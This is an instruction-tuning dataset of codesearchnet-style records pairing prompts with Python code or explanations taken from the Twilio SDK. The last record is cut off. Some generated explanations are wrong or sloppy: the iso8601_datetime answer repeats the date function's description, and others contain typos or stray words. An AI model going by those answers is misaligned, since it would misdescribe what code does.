{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ngenerate an instance context for the deviceInstance", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: DeviceContext for this DeviceInstance\n        :rtype: twilio.rest.preview.deployed_devices.fleet.device.DeviceContext\n        \"\"\"\n        if self._context is None:\n            self._context = DeviceContext(\n                self._version,\n                fleet_sid=self._solution['fleet_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nupdates the DeviceInstance with the specified parameters.", "response": "def update(self, friendly_name=values.unset, identity=values.unset,\n               deployment_sid=values.unset, enabled=values.unset):\n        \"\"\"\n        Update the DeviceInstance\n\n        :param unicode friendly_name: A human readable description for this Device.\n        :param unicode identity: An identifier of the Device user.\n        :param unicode deployment_sid: The unique SID of the Deployment group.\n        :param bool enabled: The enabled\n\n        :returns: Updated DeviceInstance\n        :rtype: twilio.rest.preview.deployed_devices.fleet.device.DeviceInstance\n        \"\"\"\n        return self._proxy.update(\n            friendly_name=friendly_name,\n            identity=identity,\n            deployment_sid=deployment_sid,\n            enabled=enabled,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef fetch(self):\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return NumberInstance(self._version, payload, number=self._solution['number'], )", "response": "Fetch a NumberInstance\n\n        :returns: Fetched NumberInstance\n        :rtype: twilio.rest.pricing.v1.voice.number.NumberInstance"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ngenerate an instance context for the resource", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: NumberContext for this NumberInstance\n        :rtype: twilio.rest.pricing.v1.voice.number.NumberContext\n        \"\"\"\n        if self._context is None:\n            self._context = NumberContext(self._version, number=self._solution['number'], )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nconstruct a RecordingContext :param sid: The unique string that identifies the resource :returns: twilio.rest.api.v2010.account.recording.RecordingContext :rtype: twilio.rest.api.v2010.account.recording.RecordingContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a RecordingContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.api.v2010.account.recording.RecordingContext\n        :rtype: twilio.rest.api.v2010.account.recording.RecordingContext\n        \"\"\"\n        return RecordingContext(self._version, account_sid=self._solution['account_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\naccess the add_on_results :returns: twilio.rest.api.v2010.account.recording.add_on_result.AddOnResultList :rtype: twilio.rest.api.v2010.account.recording.add_on_result.AddOnResultList", "response": "def add_on_results(self):\n        \"\"\"\n        Access the add_on_results\n\n        :returns: twilio.rest.api.v2010.account.recording.add_on_result.AddOnResultList\n        :rtype: twilio.rest.api.v2010.account.recording.add_on_result.AddOnResultList\n        \"\"\"\n        if self._add_on_results is None:\n            self._add_on_results = AddOnResultList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                reference_sid=self._solution['sid'],\n            )\n        return self._add_on_results"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngenerating an instance context for the recording_instance", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: RecordingContext for this RecordingInstance\n        :rtype: twilio.rest.api.v2010.account.recording.RecordingContext\n        \"\"\"\n        if self._context is None:\n            self._context = RecordingContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nfetches a CallSummaryInstance :returns: Fetched CallSummaryInstance :rtype: twilio.rest.insights.v1.summary.CallSummaryInstance", "response": "def fetch(self):\n        \"\"\"\n        Fetch a CallSummaryInstance\n\n        :returns: Fetched CallSummaryInstance\n        :rtype: twilio.rest.insights.v1.summary.CallSummaryInstance\n        \"\"\"\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return CallSummaryInstance(self._version, payload, call_sid=self._solution['call_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngenerating an instance context for the resource that is capable of performing various actions.", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: CallSummaryContext for this CallSummaryInstance\n        :rtype: twilio.rest.insights.v1.summary.CallSummaryContext\n        \"\"\"\n        if self._context is None:\n            self._context = CallSummaryContext(self._version, call_sid=self._solution['call_sid'], )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef credential_list_mappings(self):\n        if self._credential_list_mappings is None:\n            self._credential_list_mappings = AuthCallsCredentialListMappingList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                domain_sid=self._solution['domain_sid'],\n            )\n        return self._credential_list_mappings", "response": "Access the credential_list_mappings\n\n        :returns: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_calls_mapping.auth_calls_credential_list_mapping.AuthCallsCredentialListMappingList\n        :rtype: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_calls_mapping.auth_calls_credential_list_mapping.AuthCallsCredentialListMappingList"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef ip_access_control_list_mappings(self):\n        if self._ip_access_control_list_mappings is None:\n            self._ip_access_control_list_mappings = AuthCallsIpAccessControlListMappingList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                domain_sid=self._solution['domain_sid'],\n            )\n        return self._ip_access_control_list_mappings", "response": "Access the ip_access_control_list_mappings\n\n        :returns: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_calls_mapping.auth_calls_ip_access_control_list_mapping.AuthCallsIpAccessControlListMappingList\n        :rtype: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_calls_mapping.auth_calls_ip_access_control_list_mapping.AuthCallsIpAccessControlListMappingList"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nbuilds an instance of AuthTypeCallsInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of AuthTypeCallsInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_calls_mapping.AuthTypeCallsInstance\n        :rtype: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_calls_mapping.AuthTypeCallsInstance\n        \"\"\"\n        return AuthTypeCallsInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            domain_sid=self._solution['domain_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nupdates the DocumentInstance :param dict data: Contains an arbitrary JSON object to be stored in this Document. :param unicode ttl: New time-to-live of this Document in seconds. :returns: Updated DocumentInstance :rtype: twilio.rest.sync.v1.service.document.DocumentInstance", "response": "def update(self, data=values.unset, ttl=values.unset):\n        \"\"\"\n        Update the DocumentInstance\n\n        :param dict data: Contains an arbitrary JSON object to be stored in this Document.\n        :param unicode ttl: New time-to-live of this Document in seconds.\n\n        :returns: Updated DocumentInstance\n        :rtype: twilio.rest.sync.v1.service.document.DocumentInstance\n        \"\"\"\n        return self._proxy.update(data=data, ttl=ttl, )"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef iso8601_date(d):\n    if d == values.unset:\n        return d\n    elif isinstance(d, datetime.datetime):\n        return str(d.date())\n    elif isinstance(d, datetime.date):\n        return str(d)\n    elif isinstance(d, str):\n        return d", "response": "Returns a string representation of a date that the Twilio API understandsands\n    Format is YYYY - MM - DD. Returns None if d is not a string datetime or date."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef iso8601_datetime(d):\n    if d == values.unset:\n        return d\n    elif isinstance(d, datetime.datetime) or isinstance(d, datetime.date):\n        return d.strftime('%Y-%m-%dT%H:%M:%SZ')\n    elif isinstance(d, str):\n        return d", "response": "Returns a string representation of a date that the Twilio API understandsands\n    Format is YYYY - MM - DD. Returns None if d is not a string datetime or date."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef prefixed_collapsible_map(m, prefix):\n    if m == values.unset:\n        return {}\n\n    def flatten_dict(d, result={}, prv_keys=[]):\n        for k, v in d.items():\n            if isinstance(v, dict):\n                flatten_dict(v, result, prv_keys + [k])\n            else:\n                result['.'.join(prv_keys + [k])] = v\n\n        return result\n\n    if isinstance(m, dict):\n        flattened = flatten_dict(m)\n        return {'{}.{}'.format(prefix, k): v for k, v in flattened.items()}\n\n    return {}", "response": "Returns a dict of params corresponding to those in m with the added prefix\n   "}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef object(obj):\n    if isinstance(obj, dict) or isinstance(obj, list):\n        return json.dumps(obj)\n    return obj", "response": "Return a jsonified string represenation of obj."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\napplying serialize_func to every element in lst", "response": "def map(lst, serialize_func):\n    \"\"\"\n    Applies serialize_func to every element in lst\n    \"\"\"\n    if not isinstance(lst, list):\n        return lst\n    return [serialize_func(e) for e in lst]"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef add_grant(self, grant):\n        if not isinstance(grant, AccessTokenGrant):\n            raise ValueError('Grant must be an instance of AccessTokenGrant.')\n        self.grants.append(grant)", "response": "Add a grant to this AccessToken"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get(self, country_code):\n        return AvailablePhoneNumberCountryContext(\n            self._version,\n            account_sid=self._solution['account_sid'],\n            country_code=country_code,\n        )", "response": "Constructs a AvailablePhoneNumberCountryContext\n\n        :param country_code: The ISO country code of the country to fetch available phone number information about\n\n        :returns: twilio.rest.api.v2010.account.available_phone_number.AvailablePhoneNumberCountryContext\n        :rtype: twilio.rest.api.v2010.account.available_phone_number.AvailablePhoneNumberCountryContext"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nbuild an instance of AvailablePhoneNumberCountryInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of AvailablePhoneNumberCountryInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.available_phone_number.AvailablePhoneNumberCountryInstance\n        :rtype: twilio.rest.api.v2010.account.available_phone_number.AvailablePhoneNumberCountryInstance\n        \"\"\"\n        return AvailablePhoneNumberCountryInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nfetches a AvailablePhoneNumberCountryInstance :returns: Fetched AvailablePhoneNumberCountryInstance :rtype: twilio.rest.api.v2010.account.available_phone_number.AvailablePhoneNumberCountryInstance", "response": "def fetch(self):\n        \"\"\"\n        Fetch a AvailablePhoneNumberCountryInstance\n\n        :returns: Fetched AvailablePhoneNumberCountryInstance\n        :rtype: twilio.rest.api.v2010.account.available_phone_number.AvailablePhoneNumberCountryInstance\n        \"\"\"\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return AvailablePhoneNumberCountryInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            country_code=self._solution['country_code'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef local(self):\n        if self._local is None:\n            self._local = LocalList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                country_code=self._solution['country_code'],\n            )\n        return self._local", "response": "Access the local\n\n        :returns: twilio.rest.api.v2010.account.available_phone_number.local.LocalList\n        :rtype: twilio.rest.api.v2010.account.available_phone_number.local.LocalList"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\naccess the national :returns: twilio.rest.api.v2010.account.available_phone_number.national.NationalList :rtype: twilio.rest.api.v2010.account.available_phone_number.national.NationalList", "response": "def national(self):\n        \"\"\"\n        Access the national\n\n        :returns: twilio.rest.api.v2010.account.available_phone_number.national.NationalList\n        :rtype: twilio.rest.api.v2010.account.available_phone_number.national.NationalList\n        \"\"\"\n        if self._national is None:\n            self._national = NationalList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                country_code=self._solution['country_code'],\n            )\n        return self._national"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef voip(self):\n        if self._voip is None:\n            self._voip = VoipList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                country_code=self._solution['country_code'],\n            )\n        return self._voip", "response": "Access the voip\n\n        :returns: twilio.rest.api.v2010.account.available_phone_number.voip.VoipList\n        :rtype: twilio.rest.api.v2010.account.available_phone_number.voip.VoipList"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef shared_cost(self):\n        if self._shared_cost is None:\n            self._shared_cost = SharedCostList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                country_code=self._solution['country_code'],\n            )\n        return self._shared_cost", "response": "Access the shared_cost\n\n        :returns: twilio.rest.api.v2010.account.available_phone_number.shared_cost.SharedCostList\n        :rtype: twilio.rest.api.v2010.account.available_phone_number.shared_cost.SharedCostList"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef machine_to_machine(self):\n        if self._machine_to_machine is None:\n            self._machine_to_machine = MachineToMachineList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                country_code=self._solution['country_code'],\n            )\n        return self._machine_to_machine", "response": "Access the machine_to_machine\n\n        :returns: twilio.rest.api.v2010.account.available_phone_number.machine_to_machine.MachineToMachineList\n        :rtype: twilio.rest.api.v2010.account.available_phone_number.machine_to_machine.MachineToMachineList"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _proxy(self):\n        if self._context is None:\n            self._context = AvailablePhoneNumberCountryContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                country_code=self._solution['country_code'],\n            )\n        return self._context", "response": "Generate an instance context for the available_phone_number"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nconstructs a PublishedTrackContext :param sid: A 34 character string that uniquely identifies this resource. :returns: twilio.rest.video.v1.room.room_participant.room_participant_published_track.PublishedTrackContext :rtype: twilio.rest.video.v1.room.room_participant.room_participant_published_track.PublishedTrackContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a PublishedTrackContext\n\n        :param sid: A 34 character string that uniquely identifies this resource.\n\n        :returns: twilio.rest.video.v1.room.room_participant.room_participant_published_track.PublishedTrackContext\n        :rtype: twilio.rest.video.v1.room.room_participant.room_participant_published_track.PublishedTrackContext\n        \"\"\"\n        return PublishedTrackContext(\n            self._version,\n            room_sid=self._solution['room_sid'],\n            participant_sid=self._solution['participant_sid'],\n            sid=sid,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_instance(self, payload):\n        return PublishedTrackInstance(\n            self._version,\n            payload,\n            room_sid=self._solution['room_sid'],\n            participant_sid=self._solution['participant_sid'],\n        )", "response": "Build an instance of PublishedTrackInstance"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef fetch(self):\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return PublishedTrackInstance(\n            self._version,\n            payload,\n            room_sid=self._solution['room_sid'],\n            participant_sid=self._solution['participant_sid'],\n            sid=self._solution['sid'],\n        )", "response": "Fetch a PublishedTrackInstance\n\n        :returns: Fetched PublishedTrackInstance\n        :rtype: twilio.rest.video.v1.room.room_participant.room_participant_published_track.PublishedTrackInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngenerates an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: PublishedTrackContext for this PublishedTrackInstance\n        :rtype: twilio.rest.video.v1.room.room_participant.room_participant_published_track.PublishedTrackContext\n        \"\"\"\n        if self._context is None:\n            self._context = PublishedTrackContext(\n                self._version,\n                room_sid=self._solution['room_sid'],\n                participant_sid=self._solution['participant_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef request(self, method, url, params=None, data=None, headers=None, auth=None,\n                timeout=None, allow_redirects=False):\n        \"\"\"\n        Make an HTTP request.\n        \"\"\"\n        raise TwilioException('HttpClient is an abstract class')", "response": "Make an HTTP request."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nconstructing a QueueContext :param sid: The unique string that identifies this resource :returns: twilio.rest.api.v2010.account.queue.QueueContext :rtype: twilio.rest.api.v2010.account.queue.QueueContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a QueueContext\n\n        :param sid: The unique string that identifies this resource\n\n        :returns: twilio.rest.api.v2010.account.queue.QueueContext\n        :rtype: twilio.rest.api.v2010.account.queue.QueueContext\n        \"\"\"\n        return QueueContext(self._version, account_sid=self._solution['account_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nbuild an instance of QueueInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of QueueInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.queue.QueueInstance\n        :rtype: twilio.rest.api.v2010.account.queue.QueueInstance\n        \"\"\"\n        return QueueInstance(self._version, payload, account_sid=self._solution['account_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef members(self):\n        if self._members is None:\n            self._members = MemberList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                queue_sid=self._solution['sid'],\n            )\n        return self._members", "response": "Access the members\n\n        :returns: twilio.rest.api.v2010.account.queue.member.MemberList\n        :rtype: twilio.rest.api.v2010.account.queue.member.MemberList"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _proxy(self):\n        if self._context is None:\n            self._context = QueueContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef update(self, friendly_name=values.unset, max_size=values.unset):\n        return self._proxy.update(friendly_name=friendly_name, max_size=max_size, )", "response": "Update the QueueInstance\n        Domain"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\naccessing the FaxList Twilio Domain", "response": "def faxes(self):\n        \"\"\"\n        :rtype: twilio.rest.fax.v1.fax.FaxList\n        \"\"\"\n        if self._faxes is None:\n            self._faxes = FaxList(self)\n        return self._faxes"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncreating a new ParticipantInstance", "response": "def create(self, from_, to, status_callback=values.unset,\n               status_callback_method=values.unset,\n               status_callback_event=values.unset, timeout=values.unset,\n               record=values.unset, muted=values.unset, beep=values.unset,\n               start_conference_on_enter=values.unset,\n               end_conference_on_exit=values.unset, wait_url=values.unset,\n               wait_method=values.unset, early_media=values.unset,\n               max_participants=values.unset, conference_record=values.unset,\n               conference_trim=values.unset,\n               conference_status_callback=values.unset,\n               conference_status_callback_method=values.unset,\n               conference_status_callback_event=values.unset,\n               recording_channels=values.unset,\n               recording_status_callback=values.unset,\n               recording_status_callback_method=values.unset,\n               sip_auth_username=values.unset, sip_auth_password=values.unset,\n               region=values.unset,\n               conference_recording_status_callback=values.unset,\n               conference_recording_status_callback_method=values.unset,\n               recording_status_callback_event=values.unset,\n               conference_recording_status_callback_event=values.unset,\n               coaching=values.unset, call_sid_to_coach=values.unset):\n        \"\"\"\n        Create a new ParticipantInstance\n\n        :param unicode from_: The `from` phone number used to invite a participant\n        :param unicode to: The number, client id, or sip address of the new participant\n        :param unicode status_callback: The URL we should call to send status information to your application\n        :param unicode status_callback_method: The HTTP method we should use to call `status_callback`\n        :param unicode status_callback_event: Set state change events that will trigger a callback\n        :param unicode timeout: he number of seconds that we should wait for an answer\n        :param bool record: Whether to record the participant and their conferences\n        :param bool muted: Whether to mute the agent\n        :param unicode beep: Whether to play a notification beep to the conference when the participant joins\n        :param bool start_conference_on_enter: Whether the conference starts when the participant joins the conference\n        :param bool end_conference_on_exit: Whether to end the conference when the participant leaves\n        :param unicode wait_url: URL that hosts pre-conference hold music\n        :param unicode wait_method: The HTTP method we should use to call `wait_url`\n        :param bool early_media: Whether agents can hear the state of the outbound call\n        :param unicode max_participants: The maximum number of agent conference participants\n        :param unicode conference_record: Whether to record the conference the participant is joining\n        :param unicode conference_trim: Whether to trim leading and trailing silence from your recorded conference audio files\n        :param unicode conference_status_callback: The callback URL for conference events\n        :param unicode conference_status_callback_method: HTTP method for requesting `conference_status_callback` URL\n        :param unicode conference_status_callback_event: The conference state changes that should generate a call to `conference_status_callback`\n        :param unicode recording_channels: Specify `mono` or `dual` recording channels\n        :param unicode recording_status_callback: The URL that we should call using the `recording_status_callback_method` when the recording status changes\n        :param unicode recording_status_callback_method: The HTTP method we should use when we call `recording_status_callback`\n        :param unicode sip_auth_username: The SIP username used for authentication\n        :param unicode sip_auth_password: The SIP password for authentication\n        :param unicode region: The region where we should mix the conference audio\n        :param unicode conference_recording_status_callback: The URL we should call using the `conference_recording_status_callback_method` when the conference recording is available\n        :param unicode conference_recording_status_callback_method: The HTTP method we should use to call `conference_recording_status_callback`\n        :param unicode recording_status_callback_event: The recording state changes that should generate a call to `recording_status_callback`\n        :param unicode conference_recording_status_callback_event: The conference recording state changes that should generate a call to `conference_recording_status_callback`\n        :param bool coaching: Indicates if the participant changed to coach\n        :param unicode call_sid_to_coach: The SID of the participant who is being `coached`\n\n        :returns: Newly created ParticipantInstance\n        :rtype: twilio.rest.api.v2010.account.conference.participant.ParticipantInstance\n        \"\"\"\n        data = values.of({\n            'From': from_,\n            'To': to,\n            'StatusCallback': status_callback,\n            'StatusCallbackMethod': status_callback_method,\n            'StatusCallbackEvent': serialize.map(status_callback_event, lambda e: e),\n            'Timeout': timeout,\n            'Record': record,\n            'Muted': muted,\n            'Beep': beep,\n            'StartConferenceOnEnter': start_conference_on_enter,\n            'EndConferenceOnExit': end_conference_on_exit,\n            'WaitUrl': wait_url,\n            'WaitMethod': wait_method,\n            'EarlyMedia': early_media,\n            'MaxParticipants': max_participants,\n            'ConferenceRecord': conference_record,\n            'ConferenceTrim': conference_trim,\n            'ConferenceStatusCallback': conference_status_callback,\n            'ConferenceStatusCallbackMethod': conference_status_callback_method,\n            'ConferenceStatusCallbackEvent': serialize.map(conference_status_callback_event, lambda e: e),\n            'RecordingChannels': recording_channels,\n            'RecordingStatusCallback': recording_status_callback,\n            'RecordingStatusCallbackMethod': recording_status_callback_method,\n            'SipAuthUsername': sip_auth_username,\n            'SipAuthPassword': sip_auth_password,\n            'Region': region,\n            'ConferenceRecordingStatusCallback': conference_recording_status_callback,\n            'ConferenceRecordingStatusCallbackMethod': conference_recording_status_callback_method,\n            'RecordingStatusCallbackEvent': serialize.map(recording_status_callback_event, lambda e: e),\n            'ConferenceRecordingStatusCallbackEvent': serialize.map(conference_recording_status_callback_event, lambda e: e),\n            'Coaching': coaching,\n            'CallSidToCoach': call_sid_to_coach,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ParticipantInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            conference_sid=self._solution['conference_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nstream the ParticipantInstance records from the API as a generator. This operation lazily loads the participants from the API as efficiently as possible until the limit is reached.", "response": "def stream(self, muted=values.unset, hold=values.unset, coaching=values.unset,\n               limit=None, page_size=None):\n        \"\"\"\n        Streams ParticipantInstance records from the API as a generator stream.\n        This operation lazily loads records as efficiently as possible until the limit\n        is reached.\n        The results are returned as a generator, so this operation is memory efficient.\n\n        :param bool muted: Whether to return only participants that are muted\n        :param bool hold: Whether to return only participants that are on hold\n        :param bool coaching: Whether to return only participants who are coaching another call\n        :param int limit: Upper limit for the number of records to return. stream()\n                          guarantees to never return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, stream() will attempt to read the\n                              limit with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.api.v2010.account.conference.participant.ParticipantInstance]\n        \"\"\"\n        limits = self._version.read_limits(limit, page_size)\n\n        page = self.page(muted=muted, hold=hold, coaching=coaching, page_size=limits['page_size'], )\n\n        return self._version.stream(page, limits['limit'], limits['page_limit'])"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef list(self, muted=values.unset, hold=values.unset, coaching=values.unset,\n             limit=None, page_size=None):\n        \"\"\"\n        Lists ParticipantInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param bool muted: Whether to return only participants that are muted\n        :param bool hold: Whether to return only participants that are on hold\n        :param bool coaching: Whether to return only participants who are coaching another call\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.api.v2010.account.conference.participant.ParticipantInstance]\n        \"\"\"\n        return list(self.stream(\n            muted=muted,\n            hold=hold,\n            coaching=coaching,\n            limit=limit,\n            page_size=page_size,\n        ))", "response": "Streams the ParticipantInstance records from the API as a list."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nconstruct a ParticipantContext :param call_sid: The Call SID of the resource to fetch :returns: twilio.rest.api.v2010.account.conference.participant.ParticipantContext :rtype: twilio.rest.api.v2010.account.conference.participant.ParticipantContext", "response": "def get(self, call_sid):\n        \"\"\"\n        Constructs a ParticipantContext\n\n        :param call_sid: The Call SID of the resource to fetch\n\n        :returns: twilio.rest.api.v2010.account.conference.participant.ParticipantContext\n        :rtype: twilio.rest.api.v2010.account.conference.participant.ParticipantContext\n        \"\"\"\n        return ParticipantContext(\n            self._version,\n            account_sid=self._solution['account_sid'],\n            conference_sid=self._solution['conference_sid'],\n            call_sid=call_sid,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nbuild an instance of ParticipantInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of ParticipantInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.conference.participant.ParticipantInstance\n        :rtype: twilio.rest.api.v2010.account.conference.participant.ParticipantInstance\n        \"\"\"\n        return ParticipantInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            conference_sid=self._solution['conference_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef fetch(self):\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return ParticipantInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            conference_sid=self._solution['conference_sid'],\n            call_sid=self._solution['call_sid'],\n        )", "response": "Fetch a ParticipantInstance\n\n        :returns: Fetched ParticipantInstance\n        :rtype: twilio.rest.api.v2010.account.conference.participant.ParticipantInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nupdates the ParticipantInstance s related properties", "response": "def update(self, muted=values.unset, hold=values.unset, hold_url=values.unset,\n               hold_method=values.unset, announce_url=values.unset,\n               announce_method=values.unset, wait_url=values.unset,\n               wait_method=values.unset, beep_on_exit=values.unset,\n               end_conference_on_exit=values.unset, coaching=values.unset,\n               call_sid_to_coach=values.unset):\n        \"\"\"\n        Update the ParticipantInstance\n\n        :param bool muted: Whether the participant should be muted\n        :param bool hold: Whether the participant should be on hold\n        :param unicode hold_url: The URL we call using the `hold_method` for  music that plays when the participant is on hold\n        :param unicode hold_method: The HTTP method we should use to call hold_url\n        :param unicode announce_url: The URL we call using the `announce_method` for an announcement to the participant\n        :param unicode announce_method: The HTTP method we should use to call announce_url\n        :param unicode wait_url: URL that hosts pre-conference hold music\n        :param unicode wait_method: The HTTP method we should use to call `wait_url`\n        :param bool beep_on_exit: Whether to play a notification beep to the conference when the participant exit\n        :param bool end_conference_on_exit: Whether to end the conference when the participant leaves\n        :param bool coaching: Indicates if the participant changed to coach\n        :param unicode call_sid_to_coach: The SID of the participant who is being `coached`\n\n        :returns: Updated ParticipantInstance\n        :rtype: twilio.rest.api.v2010.account.conference.participant.ParticipantInstance\n        \"\"\"\n        data = values.of({\n            'Muted': muted,\n            'Hold': hold,\n            'HoldUrl': hold_url,\n            'HoldMethod': hold_method,\n            'AnnounceUrl': announce_url,\n            'AnnounceMethod': announce_method,\n            'WaitUrl': wait_url,\n            'WaitMethod': wait_method,\n            'BeepOnExit': beep_on_exit,\n            'EndConferenceOnExit': end_conference_on_exit,\n            'Coaching': coaching,\n            'CallSidToCoach': call_sid_to_coach,\n        })\n\n        payload = 